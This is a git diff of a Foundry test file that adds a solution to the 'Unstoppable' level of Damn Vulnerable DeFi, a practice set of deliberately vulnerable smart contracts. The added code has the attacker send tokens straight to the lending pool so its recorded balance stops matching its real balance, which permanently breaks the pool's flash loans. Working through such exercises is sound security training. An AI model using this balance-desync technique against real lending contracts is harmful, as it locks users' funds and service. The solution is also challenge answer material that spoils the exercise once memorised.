@@ -8,6 +8,8 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
 
+import "forge-std/console.sol";
+
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
     uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;
@@ -56,6 +58,17 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+
+        dvt.approve(address(unstoppableLender), 10);
+        dvt.approve(address(attacker), 10);
+
+        dvt.transferFrom(attacker, address(unstoppableLender), 10);
+
+        console.log("Unstoppable lender now has internal balance %s, real balance %s", unstoppableLender.poolBalance(), dvt.balanceOf(address(unstoppableLender)));
+
+        vm.stopPrank();
+        
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
